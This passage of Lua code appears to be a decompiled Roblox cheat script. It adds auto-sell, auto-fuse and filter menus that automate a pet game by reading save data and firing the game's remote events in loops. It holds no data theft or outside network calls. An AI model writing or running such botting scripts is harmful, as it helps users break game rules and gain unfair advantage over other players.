				for k, v23 in pairs(directory) do
					local rarity = type(v23) == "table" and v23.Rarity or nil
					local flag3 = type(rarity) == "table"
					local num

					if flag3 then
						num = tonumber(rarity.RarityNumber or rarity.Rank)
					else
						num = flag3
					end

					num = num or nil

					if num then
						local str3 = tostring(rarity.DisplayName or rarity._id or num)
						tbl28[num] = tbl28[num] or str3

						table.insert(tbl29, {
							Category = tostring(k),
							Name = tostring(v23.DisplayName or k),
							Rarity = num,
							RarityName = str3,
						})
					end
				end
			end

			local tbl30 = {}

			for k in pairs(tbl28) do
				table.insert(tbl30, k)
			end

			table.sort(tbl30)

			for _, v23 in ipairs(tbl30) do
				local str3 = string.format("%d - %s", v23, tbl28[v23])
				table.insert(tbl24, str3)
				tbl25[str3] = v23
			end

			table.sort(tbl29, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v23 in ipairs(tbl29) do
				local str3 = string.format("%s [%s]", v23.Name, v23.RarityName)

				if tbl27[str3] then
					str3 = string.format("%s [%s] (%s)", v23.Name, v23.RarityName, v23.Category)
				end

				table.insert(tbl26, str3)
				tbl27[str3] = v23.Category
			end

			fn39 = function(arg)
				for _, v23 in ipairs(tbl24) do
					if tbl25[v23] == arg then
						return v23
					end
				end

				return tbl24[1]
			end

			local v23 = nil
			v21 = nil
			local v24 = nil
			local v25 = nil
			local v26 = tbl23[1]
			local n18 = 3
			local n19 = 0
			local flag3 = true
			local tbl31 = {}
			local v27 = tbl23[1]
			local n20 = 3
			local n21 = 0
			local flag4 = true
			local tbl32 = {}
			local flag5 = false
			local n22 = 0

			local function fn40(arg)
				local n23 = tonumber(arg) or 0
				local tbl33 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n24 = 1

				while math.abs(n23) >= 1000 and n24 < #tbl33 do
					n23 /= 1000
					n24 += 1
				end

				return string.format(n24 == 1 and "$%.0f%s" or "$%.2f%s", n23, tbl33[n24])
			end

			local function fn41(arg, arg2)
				local tbl33 = {}

				if type(arg) == "table" then
					for k, v28 in pairs(arg) do
						k = v28 == true and type(k) == "string" and k or type(v28) == "string" and v28 or nil

						if k then
							tbl33[arg2 and arg2[k] or k] = true
						end
					end
				end

				return tbl33
			end

			local function fn42(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				local flag6 = type(directory2) == "table" and directory2[tostring(arg)] or nil
				local rarity = type(flag6) == "table" and flag6.Rarity or nil
				local flag7 = type(rarity) == "table"

				if flag7 then
					flag7 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag7 or math.huge
			end

			local function fn43(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				local flag6 = type(directory2) == "table" and directory2[tostring(arg.Category)] or nil
				local n23 = type(flag6) == "table" and tonumber(flag6.EarningRate) or 0
				local n24 = tonumber(arg.Scale) or 0
				if n23 <= 0 or n24 <= 0 then
					return 0
				end
				local n25 = n24 > 5 and (n24 / 5) ^ 1.2 * 19.637875755794113 or n24 ^ 1.85
				local mutations = tbl.Mutations
				local flag7 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n26 = 1

				if flag7 then
					local ok
					ok, n26 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					local flag8 = ok and type(n26) == "number"
					local n27 = 1

					if not flag8 then
						n26 = n27
					end
				end

				return n23 * n25 * n26
			end

			local function fn44(arg)
				return type(arg) == "table" and next(arg) ~= nil
			end

			local function fn45()
				local save3 = tbl.Save
				if type(save3) ~= "table" or type(save3.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save3.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn46()
				local v28 = fn45()
				local tbl33 = {}
				if not v28 then
					return tbl33, 0
				end
				local tbl34 = {}
				local v29 = pairs
				local equippedAssets = v28.EquippedAssets or {}

				for _, equippedAsset in v29(equippedAssets) do
					tbl34[equippedAsset] = true
				end

				local v30 = pairs
				local inventory = v28.Inventory or {}
				local n23 = 0

				for k, v31 in v30(inventory) do
					local flag6 = type(v31) == "table" and v31.InFuse ~= true and v31.IsFavorite ~= true and not tbl34[k] and not tbl31[tostring(v31.Category)]

					if flag6 then
						flag6 = not (flag3 and fn44(v31.Mutations))
					end

					if flag6 then
						local v32 = fn43(v31)
						local flag7 = fn42(v31.Category) <= n18
						local flag8 = n19 > 0 and v32 < n19

						if v26 ~= tbl23[2] then
							if v26 == tbl23[3] then
								flag8 = flag7 and flag8
							elseif v26 ~= tbl23[4] then
								flag8 = flag7
							else
								flag8 = flag7 or flag8
							end
						end

						if flag8 then
							table.insert(tbl33, k)
							local flag9 = type(v22) == "table" and type(v22.SalePrice) == "function"
							local flag10 = false
							local result = nil

							if flag9 then
								flag10, result = pcall(v22.SalePrice, v31)
							end

							n23 += flag10 and tonumber(result) or v32 * 100
						end
					end
				end

				return tbl33, n23
			end

			local function fn47()
				local tbl33 = {}
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl33, 0
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl33, 0
				end
				local character = localPlayer.Character
				character = character and character:FindFirstChildWhichIsA("Tool")
				character = character and character:GetAttribute("UID") or nil
				local eggRecords = tbl.EggRecords
				local v28, v29, v30 = pairs(result)
				local n23 = 0

				for k, v31 in v28, v29, v30 do
					local flag6 = type(v31) == "table" and v31.Placement == nil and k ~= character and not tbl32[tostring(v31.AssetCategory)]

					if flag6 then
						flag6 = not (flag4 and fn44(v31.Mutations))
					end

					if flag6 then
						local v32 = fn43({ Category = v31.AssetCategory, Scale = v31.AssetScale, Mutations = v31.Mutations })
						local flag7 = fn42(v31.AssetCategory) <= n20
						local flag8 = n21 > 0 and v32 < n21
						local v33

						if v27 == tbl23[2] then
							v33 = flag8
						elseif v27 == tbl23[3] then
							v33 = flag7 and flag8
						elseif v27 ~= tbl23[4] then
							v33 = flag7
						else
							v33 = flag7 or flag8
						end

						if v33 then
							table.insert(tbl33, k)

							if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
								local ok2, result2 = pcall(eggRecords.SellPrice, v31)
								n23 += ok2 and tonumber(result2) or 0
							end
						end
					end
				end

				return tbl33, n23
			end

			local function fn48(arg, arg2)
				local rePetSatchelSellSelection = networking:FindFirstChild("RE/PetSatchel/SellSelection")
				if not rePetSatchelSellSelection or not rePetSatchelSellSelection:IsA("RemoteEvent") then
					return false
				end
				local n23 = math.max(#arg, #arg2)
				local n24 = 1

				while n24 <= n23 do
					local tbl33 = {}
					local tbl34 = {}

					for i = n24, n24 + n17 - 1 do
						if arg[i] then
							table.insert(tbl33, arg[i])
						end

						if arg2[i] then
							table.insert(tbl34, arg2[i])
						end
					end

					pcall(rePetSatchelSellSelection.FireServer, rePetSatchelSellSelection, { Eggs = tbl34, Assets = tbl33 })
					n24 += n17

					if n24 <= n23 then
						task.wait(0.3)
					end
				end

				return true
			end

			local function fn49(arg, arg2)
				local flag6 = flag5

				if not flag5 then
					flag6 = #arg == 0 and #arg2 == 0
				end

				if flag6 then
					return
				end
				flag5 = true
				n22 = os.clock() + n16

				task.spawn(function()
					pcall(fn48, arg, arg2)
					flag5 = false
					tbl3.Wake()
				end)
			end

			tbl3.Add(function()
				local v28 = tbl4.Toggle(v23, false)
				local v29 = tbl4.Toggle(v21, false)
				local v30, v31 = fn46()
				local v32, v33 = fn47()

				if v24 and type(v24.Set) == "function" then
					pcall(v24.Set, v24, string.format("Pet matches  -  %d pets for %s", #v30, fn40(v31)))
				end

				if v25 and type(v25.Set) == "function" then
					pcall(v25.Set, v25, string.format("Egg matches  -  %d eggs for %s", #v32, fn40(v33)))
				end

				local v34 = flag5
				local flag6

				if flag5 then
					flag6 = v34
				else
					flag6 = os.clock() < n22
				end

				if not flag6 then
					flag6 = not (v28 or v29)
				end

				if flag6 then
					return false
				end
				fn49(v28 and v30 or {}, v29 and v32 or {})
				return false
			end)

			v24 = v12:CreateText({ Name = "Pet Sell Preview", Text = "Pet matches  -  0 pets" })

			v23 = v12:CreateToggle({
				Name = "Auto Sell Pet",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v12:CreateButton({
				Name = "Sell Pets Now",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = v23,
				Callback = function()
					fn49(fn46(), {})
				end,
			})

			v12:CreateDropdown({
				Name = "Sell Pet Rule",
				Note = "Which checks must pass to sell",
				Options = tbl23,
				Default = tbl23[1],
				SubOf = v23,
				Callback = function(arg)
					if table.find(tbl23, arg) then
						v26 = arg
						tbl3.Wake()
					end
				end,
			})

			v12:CreateDropdown({
				Name = "Pet Max Rarity",
				Note = "Sell pets at or below this rarity",
				Options = tbl24,
				Default = fn39(3),
				SubOf = v23,
				Callback = function(arg)
					n18 = tbl25[arg] or n18
					tbl3.Wake()
				end,
			})

			local tbl33 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local function fn50(arg, arg2, arg3, arg4)
				local n23 = 0
				local str3 = "M/s"

				local function fn51(arg5, arg6)
					if arg5 ~= nil then
						n23 = math.max(0, math.floor(tonumber(arg5) or n23))
					end

					if arg6 ~= nil then
						str3 = tostring(arg6)
					end

					arg4(n23 * (tbl33[str3] or tbl33["M/s"]).Mult)
					tbl3.Wake()
				end

				return (fn5(v12, {
					Name = arg == "Pet Value Threshold" and "Pet Sell Value" or arg == "Egg Value Threshold" and "Egg Sell Value" or arg,
					Note = arg2,
					SubOf = arg3,
					Legacy = arg,
					SectionName = "Auto Sell",
					OnRaw = function(arg5)
						fn51(math.floor(arg5 / 1000), "K/s")
					end,
				}))
			end

			fn50("Pet Value Threshold", "Sell pets worth less than this (0 = off)", v23, function(arg)
				n19 = arg
			end)

			local v28 = nil

			v28 = v12:CreateToggle({
				Name = "Keep Mutated Pets",
				Note = "Never sell mutated pets",
				Default = true,
				SubOf = v23,
				Callback = function()
					flag3 = tbl4.Toggle(v28, true)
					tbl3.Wake()
				end,
			})

			fn6(v12:CreateMultiDropdown({
				Name = "Blacklist Sell Pets",
				Note = "These pets are never sold",
				Options = tbl26,
				Default = {},
				SubOf = v23,
				Callback = function(arg)
					tbl31 = fn41(arg, tbl27)
					tbl3.Wake()
				end,
			}))

			v25 = v12:CreateText({ Name = "Egg Sell Preview", Text = "Egg matches  -  0 eggs" })

			v21 = v12:CreateToggle({
				Name = "Auto Sell Egg",
				Note = "Sell bag eggs matching the rules below",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v12:CreateButton({
				Name = "Sell Eggs Now",
				Note = "Sell matching eggs once",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = v21,
				Callback = function()
					local v29 = fn47()
					fn49({}, v29)
				end,
			})

			v12:CreateDropdown({
				Name = "Sell Egg Rule",
				Note = "Which checks must pass to sell",
				Options = tbl23,
				Default = tbl23[1],
				SubOf = v21,
				Callback = function(arg)
					if table.find(tbl23, arg) then
						v27 = arg
						tbl3.Wake()
					end
				end,
			})

			v12:CreateDropdown({
				Name = "Egg Max Rarity",
				Note = "Sell eggs at or below this rarity",
				Options = tbl24,
				Default = fn39(3),
				SubOf = v21,
				Callback = function(arg)
					n20 = tbl25[arg] or n20
					tbl3.Wake()
				end,
			})

			fn50("Egg Value Threshold", "Sell eggs worth less than this (0 = off)", v21, function(arg)
				n21 = arg
			end)

			local v29 = nil

			v29 = v12:CreateToggle({
				Name = "Keep Mutated Eggs",
				Note = "Never sell mutated eggs",
				Default = true,
				SubOf = v21,
				Callback = function()
					flag4 = tbl4.Toggle(v29, true)
					tbl3.Wake()
				end,
			})

			fn6(v12:CreateMultiDropdown({
				Name = "Blacklist Sell Eggs",
				Note = "These eggs are never sold",
				Options = tbl26,
				Default = {},
				SubOf = v21,
				Callback = function(arg)
					tbl32 = fn41(arg, tbl27)
					tbl3.Wake()
				end,
			}))
		end

		local save3 = tbl.Save

		if type(save3) == "table" and type(save3.FieldSignal) == "function" then
			for _, v22 in ipairs({ "Inventory", "EggInventory", "EquippedAssets" }) do
				local ok, result = pcall(save3.FieldSignal, v22)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local n18
		n18 = 2
		local n19
		n19 = 3
		local n20
		n20 = 20
		local tbl28
		tbl28 = { "Lowest Rarity First", "Highest Rarity First", "Most Copies First", "Lowest Value First" }
		local tbl29
		tbl29 = { "Lowest To Highest", "Highest To Lowest" }
		local tbl30
		tbl30 = {}
		local tbl31
		tbl31 = {}
		local tbl32
		tbl32 = {}
		local tbl33
		tbl33 = {}

		do
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl34 = {}
			local tbl35 = {}

			if type(directory) == "table" then
				for k, v22 in pairs(directory) do
					local rarity = type(v22) == "table" and v22.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					local v23 = flag3 or nil

					if v23 then
						local str3 = tostring(rarity.DisplayName or rarity._id or v23)
						tbl34[v23] = tbl34[v23] or str3

						table.insert(tbl35, {
							Category = tostring(k),
							Name = tostring(v22.DisplayName or k),
							Rarity = v23,
							RarityName = str3,
						})
					end
				end
			end

			local tbl36 = {}

			for k in pairs(tbl34) do
				table.insert(tbl36, k)
			end

			table.sort(tbl36)

			for _, v22 in ipairs(tbl36) do
				local str3 = string.format("%d - %s", v22, tbl34[v22])
				table.insert(tbl30, str3)
				tbl31[str3] = v22
			end

			table.sort(tbl35, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v22 in ipairs(tbl35) do
				local str3 = string.format("%s [%s]", v22.Name, v22.RarityName)

				if tbl33[str3] then
					str3 = string.format("%s [%s] (%s)", v22.Name, v22.RarityName, v22.Category)
				end

				table.insert(tbl32, str3)
				tbl33[str3] = v22.Category
			end
		end

		local v22

		do
			local function fn40(arg)
				for _, v23 in ipairs(tbl30) do
					if tbl31[v23] == arg then
						return v23
					end
				end

				return tbl30[#tbl30]
			end

			v22 = nil
			local v23 = nil
			local v24 = tbl28[1]
			local v25 = tbl29[1]
			local n21 = 6
			local tbl34 = {}
			local flag3 = true
			local flag4 = true
			local flag5 = false
			local n22 = 0
			local n23 = 0
			local n24 = 0
			local tbl35 = {}

			local function fn41(arg, arg2)
				local v26 = networking:FindFirstChild(arg)
				if not v26 or not v26:IsA("RemoteFunction") then
					return false, nil
				end

				if arg2 == nil then
					return pcall(v26.InvokeServer, v26)
				end
				return pcall(v26.InvokeServer, v26, arg2)
			end

			local function fn42()
				local save4 = tbl.Save
				if type(save4) ~= "table" or type(save4.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save4.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn43(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				return type(directory) == "table" and directory[tostring(arg)] or nil
			end

			local function fn44(arg)
				local v26 = fn43(arg)
				local rarity = type(v26) == "table" and v26.Rarity or nil
				local flag6 = type(rarity) == "table"

				if flag6 then
					flag6 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag6 or math.huge
			end

			local function fn45(arg)
				local v26 = fn43(arg)
				return tostring(type(v26) == "table" and v26.DisplayName or arg)
			end

			local function fn46(arg)
				local v26 = fn43(arg.Category)
				local n25 = type(v26) == "table" and tonumber(v26.EarningRate) or 0
				local n26 = tonumber(arg.Scale) or 0
				if n25 <= 0 or n26 <= 0 then
					return 0
				end
				local n27 = n26 > 5 and (n26 / 5) ^ 1.2 * 19.637875755794113 or n26 ^ 1.85
				local mutations = tbl.Mutations
				local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n28 = 1

				if flag6 then
					local ok, result = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})

					if ok and type(result) == "number" then
						n28 = result
					end
				end

				return n25 * n27 * n28
			end

			local function fn47(arg)
				return type(arg) == "table" and next(arg) ~= nil
			end

			local function fn48(arg)
				local n25 = tonumber(arg) or 0
				local tbl36 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n26 = 1

				while math.abs(n25) >= 1000 and n26 < #tbl36 do
					n25 /= 1000
					n26 += 1
				end

				return string.format(n26 == 1 and "$%.0f%s" or "$%.2f%s", n25, tbl36[n26])
			end

			local function fn49(arg)
				local fuseKernel = tbl.FuseKernel
				if type(fuseKernel) ~= "table" or type(fuseKernel.PriceFor) ~= "function" then
					return nil
				end
				local ok, result = pcall(fuseKernel.PriceFor, arg)
				return ok and tonumber(result) or nil
			end

			local function fn50(arg, arg2, arg3)
				local flag6 = type(arg2) == "table" and arg2.IsFavorite ~= true and not arg3[arg] and fn44(arg2.Category) <= n21
				local flag7

				if flag6 then
					flag7 = next(tbl34) == nil or tbl34[tostring(arg2.Category)] == true
				else
					flag7 = flag6
				end

				if flag7 then
					flag7 = not (flag3 and fn47(arg2.Mutations))
				end

				if flag7 then
					flag7 = (tbl35[arg] or 0) <= os.clock()
				end

				return flag7
			end

			local function fn51(arg)
				local inventory = type(arg.Inventory) == "table" and arg.Inventory or {}
				local tbl36 = {}
				local v26 = pairs
				local equippedAssets = arg.EquippedAssets or {}

				for _, equippedAsset in v26(equippedAssets) do
					tbl36[equippedAsset] = true
				end

				local tbl37 = {}
				local tbl38 = {}

				for i = 1, 3 do
					local flag6 = type(arg.FusionSlots) == "table" and arg.FusionSlots[i] or nil

					if flag6 ~= nil and type(inventory[flag6]) == "table" then
						table.insert(tbl37, flag6)
						tbl38[flag6] = true
					end
				end

				local tbl39 = {}

				for k, v27 in pairs(inventory) do
					if not tbl38[k] and type(v27) == "table" and v27.InFuse ~= true and fn50(k, v27, tbl36) then
						local str3 = tostring(v27.Category)
						tbl39[str3] = tbl39[str3] or {}
						table.insert(tbl39[str3], { Uid = k, Item = v27, Income = fn46(v27) })
					end
				end

				local function fn52(arg2)
					table.sort(arg2, function(arg3, arg4)
						if arg3.Income ~= arg4.Income then
							if v25 == tbl29[2] then
								return arg3.Income > arg4.Income
							end
							return arg3.Income < arg4.Income
						end

						return tostring(arg3.Uid) < tostring(arg4.Uid)
					end)
				end

				if #tbl37 > 0 then
					local str3 = tostring(inventory[tbl37[1]].Category)
					local flag6 = true

					for _, v27 in ipairs(tbl37) do
						local v28 = inventory[v27]

						if tostring(v28.Category) ~= str3 or not fn50(v27, v28, tbl36) then
							flag6 = false
						end
					end

					local tbl40 = tbl39[str3] or {}

					if flag6 and #tbl37 + #tbl40 >= 3 then
						fn52(tbl40)
						local tbl41 = { Category = str3, Load = {}, Items = {} }

						for _, v27 in ipairs(tbl37) do
							table.insert(tbl41.Items, inventory[v27])
						end

						for i = 1, 3 - #tbl37 do
							table.insert(tbl41.Load, tbl40[i].Uid)
							table.insert(tbl41.Items, tbl40[i].Item)
						end

						return tbl41
					end

					if flag4 then
						return { Category = str3, Eject = tbl37 }
					end
					return nil, "Machine holds pets that cannot finish a fuse"
				end

				local v27 = nil
				local v28 = nil

				for k, v29 in pairs(tbl39) do
					if #v29 >= 3 then
						local v30 = fn44(k)
						local n25 = 0

						for _, v31 in ipairs(v29) do
							n25 += v31.Income
						end

						local tbl40

						if v24 == tbl28[2] then
							tbl40 = { -v30, -#v29 }
						elseif v24 == tbl28[3] then
							tbl40 = { -#v29, v30 }
						elseif v24 == tbl28[4] then
							tbl40 = { n25 / #v29, v30 }
						else
							tbl40 = { v30, -#v29 }
						end

						if v27 == nil or tbl40[1] < v27[1] or tbl40[1] == v27[1] and (tbl40[2] < v27[2] or tbl40[2] == v27[2] and k < v28) then
							v27 = tbl40
							v28 = k
						end
					end
				end

				if not v28 then
					return nil, "No three matching pets"
				end
				local v29 = tbl39[v28]
				fn52(v29)
				local tbl40 = { Category = v28, Load = {}, Items = {} }

				for i = 1, 3 do
					table.insert(tbl40.Load, v29[i].Uid)
					table.insert(tbl40.Items, v29[i].Item)
				end

				return tbl40
			end

			local function fn52(arg)
				local v26 = fn42()
				if not v26 then
					return
				end

				if v26.FusionLocked == true then
					if type(v26.FusionEggReward) == "table" and os.clock() >= n24 then
						n24 = os.clock() + n19
						fn41("RF/Fusery/FinishReveal")
					end

					return
				end

				local v27 = fn51(v26)
				if not v27 then
					return
				end

				if v27.Eject then
					for _, v28 in ipairs(v27.Eject) do
						if arg ~= n22 then
							return
						end
						fn41("RF/Fusery/EjectPet", v28)
						task.wait(0.35)
					end

					return
				end

				local v28 = fn49(v27.Items)
				local num = tonumber(v26.Money)
				if v28 and num and num < v28 then
					return
				end

				for _, v29 in ipairs(v27.Load) do
					if arg ~= n22 then
						return
					end
					local LoadPet, v30 = fn41("RF/Fusery/LoadPet", v29)
					if not LoadPet or v30 == false then
						tbl35[v29] = os.clock() + n20
						return
					end
					task.wait(0.35)
				end

				if arg ~= n22 then
					return
				end
				local BeginFuse, v29 = fn41("RF/Fusery/BeginFuse")

				if BeginFuse and v29 ~= false then
					n24 = os.clock() + n19
				end
			end

			local function fn53(arg)
				if not arg then
					return "Fuse status unknown"
				end

				if arg.FusionLocked == true then
					return "Machine is fusing, waiting for the egg"
				end
				local v26, v27 = fn51(arg)
				if not v26 then
					return v27 or "No three matching pets"
				end

				if v26.Eject then
					return string.format("Would eject %d %s that cannot finish a fuse", #v26.Eject, fn45(v26.Category))
				end
				local v28 = fn49(v26.Items)
				local num = tonumber(arg.Money)
				local str3 = v28 and num and num < v28 and "  (not enough money)" or ""
				return string.format("Next fuse  -  3 %s for %s%s", fn45(v26.Category), v28 and fn48(v28) or "?", str3)
			end

			tbl3.Add(function()
				local v26 = fn42()

				if v23 and type(v23.Set) == "function" then
					pcall(v23.Set, v23, fn53(v26))
				end

				if not tbl4.Toggle(v22, false) or flag5 or os.clock() < n23 then
					return false
				end
				flag5 = true
				n23 = os.clock() + n18
				local v27 = n22

				task.spawn(function()
					pcall(fn52, v27)
					flag5 = false
					tbl3.Wake()
				end)

				return false
			end)

			v23 = v13:CreateText({ Name = "Fuse Preview", Text = "Fuse status unknown" })

			v22 = v13:CreateToggle({
				Name = "Auto Fuse Machine",
				Note = "Fuse 3 same pets into an egg, nonstop",
				Default = false,
				Callback = function()
					n22 += 1
					table.clear(tbl35)
					n23 = 0
					tbl3.Wake()
				end,
			})

			v13:CreateDropdown({
				Name = "Fuse Priority Mode",
				Options = tbl28,
				Default = tbl28[1],
				SubOf = v22,
				Callback = function(arg)
					if table.find(tbl28, arg) then
						v24 = arg
						tbl3.Wake()
					end
				end,
			})

			v13:CreateDropdown({
				Name = "Pets To Use",
				Options = tbl29,
				Default = tbl29[1],
				SubOf = v22,
				Callback = function(arg)
					if table.find(tbl29, arg) then
						v25 = arg
						tbl3.Wake()
					end
				end,
			})

			v13:CreateDropdown({
				Name = "Max Rarity to Fuse",
				Options = tbl30,
				Default = fn40(6),
				SubOf = v22,
				Callback = function(arg)
					n21 = tbl31[arg] or n21
					tbl3.Wake()
				end,
			})

			fn6(v13:CreateMultiDropdown({
				Name = "Specific Species to Fuse",
				Note = "Only fuse these species (empty = all)",
				Options = tbl32,
				Default = {},
				SubOf = v22,
				Callback = function(arg)
					local tbl36 = {}

					if type(arg) == "table" then
						for k, v26 in pairs(arg) do
							k = v26 == true and type(k) == "string" and k or type(v26) == "string" and v26 or nil

							if k and tbl33[k] then
								tbl36[tbl33[k]] = true
							end
						end
					end

					tbl34 = tbl36
					tbl3.Wake()
				end,
			}))

			local v26 = nil

			v26 = v13:CreateToggle({
				Name = "Skip Mutated Pets",
				Default = true,
				SubOf = v22,
				Callback = function()
					flag3 = tbl4.Toggle(v26, true)
					tbl3.Wake()
				end,
			})

			local v27 = nil

			v27 = v13:CreateToggle({
				Name = "Eject Incomplete Slots",
				Note = "Take out pets that can't make a set",
				Default = true,
				SubOf = v22,
				Callback = function()
					flag4 = tbl4.Toggle(v27, true)
					tbl3.Wake()
				end,
			})
		end

		local save4 = tbl.Save

		if type(save4) == "table" and type(save4.FieldSignal) == "function" then
			for _, v23 in ipairs({
				"Inventory",
				"EquippedAssets",
				"FusionSlots",
				"FusionLocked",
				"FusionEggReward",
				"Money",
			}) do
				local ok, result = pcall(save4.FieldSignal, v23)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end
	end

	do
		local n = 2
		local n2 = 25
		local n3 = 4
		local tbl10 = { "Match Any", "Match All" }
		local tbl11 = { "Golden", "Silver", "Rainbow", "Boss", "Monstrous", "Sakura", "GreatBloom" }
		local str = "Any Mutation"
		local tbl12 = { "Off" }
		local tbl13 = {}
		local tbl14 = {}
		local tbl15 = {}
		local tbl16 = { "Any Mutation" }
		local tbl17 = {}
		local directory = tbl.Assets and tbl.Assets.Directory
		local tbl18 = {}
		local tbl19 = {}

		if type(directory) == "table" then
			for k, v8 in pairs(directory) do
				local rarity = type(v8) == "table" and v8.Rarity or nil
				local flag = type(rarity) == "table"

				if flag then
					flag = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				flag = flag or nil

				if flag then
					local str2 = tostring(rarity.DisplayName or rarity._id or flag)
					tbl18[flag] = tbl18[flag] or str2

					table.insert(tbl19, {
						Category = tostring(k),
						Name = tostring(v8.DisplayName or k),
						Rarity = flag,
						RarityName = str2,
					})
				end
			end
		end

		local tbl20 = {}

		for k in pairs(tbl18) do
			table.insert(tbl20, k)
		end

		table.sort(tbl20)

		for _, v8 in ipairs(tbl20) do
			local str2 = string.format("%d - %s", v8, tbl18[v8])
			table.insert(tbl12, str2)
			tbl13[str2] = v8
		end

		table.sort(tbl19, function(arg, arg2)
			if arg.Rarity ~= arg2.Rarity then
				return arg.Rarity < arg2.Rarity
			end
			return arg.Name < arg2.Name
		end)

		for _, v8 in ipairs(tbl19) do
			local str2 = string.format("%s [%s]", v8.Name, v8.RarityName)

			if tbl15[str2] then
				str2 = string.format("%s [%s] (%s)", v8.Name, v8.RarityName, v8.Category)
			end

			table.insert(tbl14, str2)
			tbl15[str2] = v8.Category
		end

		local tbl21 = {}
		local mutations = tbl.Mutations

		if type(mutations) == "table" and type(mutations.IdSet) == "table" then
			for k in pairs(mutations.IdSet) do
				table.insert(tbl21, tostring(k))
			end
		end

		if #tbl21 == 0 then
			tbl21 = table.clone(tbl11)
		end

		table.sort(tbl21, function(arg, arg2)
			return fn7(arg) < fn7(arg2)
		end)

		for _, v8 in ipairs(tbl21) do
			local v9 = fn7(v8)
			table.insert(tbl16, v9)
			tbl17[v9] = v8
		end

		local v8 = nil
		local v9 = nil
		local v10 = nil
		local v11 = nil
		local v12 = tbl10[2]
		local v13 = nil
		local flag = false
		local tbl22 = {}
		local n4 = 0
		local tbl23 = {}
		local flag2 = false
		local n5 = 0
		local tbl24 = {}

		local function fn8()
			local save = tbl.Save
			if type(save) ~= "table" or type(save.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save.Get)
			return ok and type(result) == "table" and result or nil
		end

		local function fn9(arg)
			local directory2 = tbl.Assets and tbl.Assets.Directory
			return type(directory2) == "table" and directory2[tostring(arg)] or nil
		end

		local function fn10(arg)
			local v14 = fn9(arg)
			local rarity = type(v14) == "table" and v14.Rarity or nil
			local flag3 = type(rarity) == "table"

			if flag3 then
				flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			return flag3 or 0
		end

		local function fn11(arg)
			local v14 = fn9(arg.Category)
			local n6 = type(v14) == "table" and tonumber(v14.EarningRate) or 0
			local n7 = tonumber(arg.Scale) or 0
			if n6 <= 0 or n7 <= 0 then
				return 0
			end
			local n8 = n7 > 5 and (n7 / 5) ^ 1.2 * 19.637875755794113 or n7 ^ 1.85
			local mutations2 = tbl.Mutations
			local flag3 = type(mutations2) == "table" and type(mutations2.EarningsFor) == "function"
			local n9 = 1

			if flag3 then
				local ok
				ok, n9 = pcall(mutations2.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
				local flag4 = ok and type(n9) == "number"
				local n10 = 1

				if not flag4 then
					n9 = n10
				end
			end

			return n6 * n8 * n9
		end

		local function fn12(arg)
			local tbl25 = {}

			if type(arg.Mutations) == "table" then
				for k, mutation in pairs(arg.Mutations) do
					if type(mutation) == "string" then
						tbl25[mutation] = true
					elseif mutation == true and type(k) == "string" then
						tbl25[k] = true
					end
				end
			end

			if type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
				tbl25[arg.BaseMutation] = true
			end

			return tbl25
		end

		local function fn13(arg)
			if tbl23[tostring(arg.Category)] then
				return true
			end
			local n6 = 0
			local n7 = 0

			if v13 then
				n7 = 1

				if v13 <= fn10(arg.Category) then
					n6 = 1
				end
			end

			if flag or next(tbl22) ~= nil then
				n7 += 1
				local v14 = fn12(arg)

				if flag and next(v14) ~= nil then
					n6 += 1
				else
					local flag3 = false

					for k in pairs(v14) do
						if tbl22[k] then
							flag3 = true
							break
						end
					end

					if flag3 then
						n6 += 1
					end
				end
			end

			if n4 > 0 then
				n7 += 1

				if n4 <= fn11(arg) then
					n6 += 1
				end
			end

			if n7 == 0 then
				return false
			end

			if v12 == tbl10[2] then
				return n6 == n7
			end
			return n6 > 0
		end

		local function fn14(arg)
